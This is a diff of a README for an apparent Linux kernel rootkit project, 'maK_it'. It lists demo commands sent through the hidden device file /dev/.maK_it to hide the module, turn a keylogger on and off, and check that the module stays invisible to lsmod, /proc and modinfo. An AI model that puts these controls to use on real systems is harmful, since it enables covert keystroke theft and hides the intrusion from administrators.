@@ -30,17 +30,26 @@ Building towards development of a rootkit...
 Demo Commands
 ===============
 Hide the module: echo modHide > /dev/.maK_it
+
 Reveal the module: echo modReveal > /dev/.maK_it
 
 We can confirm the module is hidden by running some of the following:
+
 lsmod | grep maK
+
 grep maK /proc/modules
+
 grep maK_it /proc/kallsyms
+
 ls /sys/modules | grep maK
+
 modinfo maK_it
+
 modprobe -c | grep maK
 
+
 Turn Key logger on: echo keyLogOn > /dev/.maK_it
+
 Turn Key logger off: echo keyLogOff > /dev/.maK_it
 
 Turn debug on/off: echo debug > /dev/.maK_it
